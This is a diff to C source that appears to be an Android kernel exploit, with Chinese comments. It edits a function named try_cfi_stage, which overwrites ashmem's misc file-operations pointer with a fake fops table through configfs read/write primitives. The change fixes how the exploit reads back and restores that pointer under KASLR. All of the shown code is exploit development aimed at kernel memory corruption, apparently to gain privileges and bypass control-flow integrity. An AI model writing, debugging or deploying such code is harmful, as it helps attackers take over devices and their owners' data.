@@ -584,12 +584,10 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  /* 读侧与写侧同族: W1 写目标经 data_addr(见 prepare_skb_payload 的
-   * write_right, 与 canon_addr 现已指向同一物理页), 这里也用 data_addr
-   * 读回同一页。p0_data_alias 修正后 data_addr 正确别名到 misc_fops 所在
-   * 物理页, 读到的即为 W1 写入的 fake_fops; 与上游(Poc-Analysis 已验证版)
-   * 完全一致。 */
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  /* W1 写目标 = canon_addr(见 prepare_pselect_fdsets 的 misc_fops_target),
+   * 读侧必须用同一地址。之前用 data_addr(linear map alias)在 KASLR 开启时
+   * 可能不映射内核镜像物理页 → configfs_read_once 返回 0 → step=4 误判。 */
+  uintptr_t misc_fops = canon_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
@@ -722,10 +720,7 @@ int try_cfi_stage(void) {
 
 fail:
   if (dirty) {
-    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
-    if (kaslr_done) {
-      original_fops_fail = canon_addr(ASHMEM_FOPS);
-    }
+    uint64_t original_fops_fail = canon_addr(ASHMEM_FOPS);
     cfi_restore_ret = configfs_write_once(
         fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
     if (can_read_back &&
